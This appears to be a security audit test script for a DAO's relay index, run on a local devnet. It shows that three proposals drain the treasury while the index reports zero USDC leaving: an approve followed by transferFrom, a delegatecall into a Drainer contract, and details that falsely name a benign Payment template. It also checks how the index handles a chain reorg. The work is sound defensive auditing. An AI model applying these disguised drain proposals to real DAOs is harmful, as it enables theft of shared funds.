/**
 * Component 7, row ECO-06 (impersonation / mislabelled effect) and component 6, row OPS-07 (index
 * under a reorg). What a sleeping-but-polling member sees is relay/chain.ts readDaoState: its
 * `treasuryEffect.usdcOut` counts only `USDC.transfer` calls from the Safe. Three proposals that drain
 * the whole treasury show usdcOut = 0: (1) `USDC.approve(attacker, max)` then a later transferFrom;
 * (2) a delegatecall entry (operation 1) into a Drainer that runs as the Safe; (3) details JSON that
 * names a benign Payment instance while the calls fund nothing of the sort. Then anvil_reorg is tried
 * against the persisted index (checkpoint hash). Expected: (1)-(3) demonstrated with the index output;
 * reorg: index rebuilt (or method unavailable, argued).
 */
import { mkdirSync } from "node:fs";
import path from "node:path";

import { encodeFunctionData, keccak256, type Hex } from "viem";

import { assert, fmtS, processProposal, propose, read, runIfMain, seedMembers, SETTLEMENT_UNIT, shutdown, snapshot, step, transferCall, verdict, vote, warpPastGrace } from "../../../scenarios/lib.js";
import { deployTemplate, proposalDetails } from "../../../src/proposals.js";
import { bootAudit, deployAudit } from "./lib-audit.js";

export async function main(): Promise<void> {
  const mirror = await bootAudit("audit-eco06");
  let passed = false;
  try {
    const stateDir = path.join(mirror.devnet!.stateDir, "relay");
    mkdirSync(stateDir, { recursive: true, mode: 0o700 });
    process.env.RELAY_STATE_DIR = stateDir;
    const { connect } = await import("../../../relay/common.js");
    const { readDaoState, invalidateState } = await import("../../../relay/chain.js");
    const dao = mirror.dao;
    const deployment = { rpcUrl: mirror.devnet!.rpcUrl, chainId: mirror.devnet!.chainId, startBlock: Number(dao.startBlock), deployer: dao.params.founder, founder: dao.params.founder, settlement: dao.settlement, safe: dao.safe, baal: dao.baal, shares: dao.shares, loot: dao.loot, depositShaman: dao.depositShaman, workManager: dao.workManager, templateFactory: dao.templateFactory, templateDeployers: dao.templateDeployers, intentAccount: dao.intentAccount, constitution: { address: dao.constitution, textHash: dao.constitutionHash, textUrl: dao.constitutionTextUrl }, singletons: dao.infrastructure, governance: { votingPeriod: 21600, gracePeriod: 21600, proposalOffering: "0", quorumPercent: "0", sponsorThreshold: "1000000000000000000", minRetentionPercent: "66" } };
    const env = connect(deployment as never);
    const view = async (id: number): Promise<{ usdcOut: string; summary: string; calls: string[]; instance?: string }> => {
      invalidateState();
      const state = await readDaoState(env, 0);
      const p = state.proposals.find((candidate) => candidate.id === id)!;
      const out = { usdcOut: p.treasuryEffect.usdcOutFormatted, summary: p.treasuryEffect.summary, calls: p.calls.map((call) => call.label), instance: p.instance ? `${p.instance.template} ${p.instance.address} budget ${p.instance.budgetUsdc}` : undefined };
      console.log(`   /proposals.json #${id}: usdcOut=${out.usdcOut} summary="${out.summary}" calls=[${out.calls.join(" ; ")}]${out.instance ? ` instance=${out.instance}` : ""}`);
      return out;
    };
    const seeded = await seedMembers(mirror);
    const W = mirror.actors.W.account.address;

    step("(1) approve-based drain: Safe approves W for the whole balance; the index shows 0 USDC leaving");
    const approve = await propose(mirror, "A", [{ to: dao.settlement, data: encodeFunctionData({ abi: mirror.abi.settlement, functionName: "approve", args: [W, 2n ** 128n] }) }], "A: housekeeping");
    const v1 = await view(approve.id);
    assert(v1.usdcOut === "0", "index reports usdcOut 0 for an approve that hands the treasury to W");
    await vote(mirror, "A", approve.id, true);
    await warpPastGrace(mirror, approve.id);
    await processProposal(mirror, "A", approve);
    const pull = await mirror.actors.W.walletClient.writeContract({ address: dao.settlement, abi: mirror.abi.settlement, functionName: "transferFrom", args: [dao.safe, W, seeded.safeSettlement], account: mirror.actors.W.account, chain: mirror.actors.W.chain });
    await mirror.chain.publicClient.waitForTransactionReceipt({ hash: pull });
    const afterPull = await snapshot(mirror, "after W transferFrom", ["W"]);
    assert(afterPull.safeSettlement === 0n, `W pulled ${fmtS(seeded.safeSettlement)} USDC any time after execution (tx ${pull}); no proposal, vote or grace involved in the pull`);

    step("(2) delegatecall drain: refill, then a proposal whose only call is operation=1 into a Drainer");
    await mirror.actors.W.walletClient.writeContract({ address: dao.settlement, abi: mirror.abi.settlement, functionName: "transfer", args: [dao.safe, seeded.safeSettlement], account: mirror.actors.W.account, chain: mirror.actors.W.chain });
    const drainer = await deployAudit(mirror.actors.A, "Drainer");
    const dc = await propose(mirror, "A", [{ to: drainer.address, operation: 1, data: encodeFunctionData({ abi: drainer.artifact.abi, functionName: "drain", args: [dao.settlement, W] }) }], "A: maintenance");
    const v2 = await view(dc.id);
    assert(v2.usdcOut === "0" && v2.calls.every((label) => !label.includes("USDC.transfer")), "index reports usdcOut 0 and an opaque selector for the delegatecall drain");
    await vote(mirror, "A", dc.id, true);
    await warpPastGrace(mirror, dc.id);
    const executedDc = await processProposal(mirror, "A", dc);
    assert(executedDc.info.status.passed && (await read<bigint>(mirror, "settlement", "balanceOf", [dao.safe])) === 0n, `Safe drained by delegatecall: ${fmtS(seeded.safeSettlement)} USDC to W`);

    step("(3) impersonating a template: details claim a benign Payment instance, calls do something else");
    await mirror.actors.W.walletClient.writeContract({ address: dao.settlement, abi: mirror.abi.settlement, functionName: "transfer", args: [dao.safe, seeded.safeSettlement], account: mirror.actors.W.account, chain: mirror.actors.W.chain });
    const benign = await deployTemplate(mirror.actors.A, dao, { template: "Payment", params: { recipients: [mirror.actors.O.account.address], amounts: [10n * SETTLEMENT_UNIT] } });
    const details = proposalDetails(benign, "A: pay O 10 USDC (Payment template)");
    const fake = await propose(mirror, "A", [transferCall(mirror, W, seeded.safeSettlement)], details);
    const v3 = await view(fake.id);
    assert(v3.instance !== undefined && v3.instance.includes("budget 10"), `index attaches the claimed instance (${v3.instance}) next to calls that pay W ${v3.usdcOut} USDC: an agent reading details/instance is misled; only the decoded calls tell the truth`);
    const codeHashClaimed = keccak256(((await mirror.chain.publicClient.getCode({ address: benign.address })) ?? "0x") as Hex);
    console.log(`   details carry codeHash ${benign.codeHash.slice(0, 18)}... of the benign instance (live ${codeHashClaimed.slice(0, 18)}...) while proposalData funds ${W}`);

    step("(4) reorg: anvil_reorg against the persisted index checkpoint");
    const head = await mirror.chain.publicClient.getBlock();
    try {
      await mirror.chain.publicClient.request({ method: "anvil_reorg" as never, params: [2, []] as never });
      const newHead = await mirror.chain.publicClient.getBlock({ blockNumber: head.number });
      invalidateState();
      const state = await readDaoState(env, 0);
      console.log(`   anvil_reorg depth 2: block ${head.number} hash ${head.hash.slice(0, 12)} -> ${newHead.hash.slice(0, 12)}; index rescanned, proposals now ${state.proposals.length} (last id ${state.proposals.at(-1)?.id}, state ${state.proposals.at(-1)?.state})`);
    } catch (error) {
      console.log(`   anvil_reorg unavailable on this anvil (${(error instanceof Error ? error.message : String(error)).split("\n")[0]}); argued from relay/chain.ts: the checkpoint block hash is re-read on every scan and a mismatch discards the cache`);
    }
    passed = true;
  } finally {
    verdict("ECO-06/OPS-07 hidden-treasury-effect", passed);
    await shutdown(mirror);
  }
}

runIfMain(import.meta.url, main);
